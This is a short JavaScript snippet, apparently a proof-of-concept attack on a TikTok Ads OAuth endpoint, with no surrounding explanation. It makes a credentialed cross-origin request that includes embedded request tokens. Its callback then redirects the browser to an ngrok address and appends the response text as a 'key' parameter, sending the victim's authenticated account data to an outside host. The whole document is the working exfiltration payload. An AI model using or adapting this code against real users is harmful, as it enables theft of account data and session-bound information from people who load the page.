var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://ads.tiktok.com/ac/api/v1/oauth/tt_oauth_base_info?msToken=-_CmeTG22eMpPpPCPh9BY3_yqAm-eiEPFz3xPakAibImUSqX0eZQ4ECjF4f9LrTnmehKefiM4G57xjo1vJVdolPrNSmw6UrRj4jJESVJe6Nn6xIcg9Bt_z-QfJ9bxMPpH9earg4U8bolGK21dMM=&X-Bogus=DFSzsIVLnOTANV/HtxasStWdbTbA&_signature=_02B4Z6wo00001.2zvDAAAIDD18pEpBGo89f9sriAAJuQa8");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
};
